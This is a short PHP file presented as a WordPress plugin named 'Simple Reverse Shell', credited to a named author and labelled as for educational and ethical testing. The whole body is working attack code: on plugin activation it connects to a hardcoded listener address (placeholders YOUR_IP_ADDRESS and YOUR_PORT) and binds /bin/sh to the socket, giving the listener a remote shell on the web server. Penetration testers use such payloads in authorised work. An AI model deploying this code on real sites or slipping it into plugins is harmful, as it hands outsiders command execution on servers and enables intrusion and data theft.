<?php
/*
Plugin Name: Simple Reverse Shell
Description: This plugin creates a reverse shell connection upon activation, IP and port are hardcoded. For educational and ethical testing purposes only.
Version: 0.1
Author: Sanjin Dedic
*/

function activate_reverse_shell() {
    $ip = 'YOUR_IP_ADDRESS'; // Change this to your IP address
    $port = YOUR_PORT; // Change this to your listening port

    $sock=fsockopen($ip, $port);
    $proc=proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
}

register_activation_hook(__FILE__, 'activate_reverse_shell');
?>
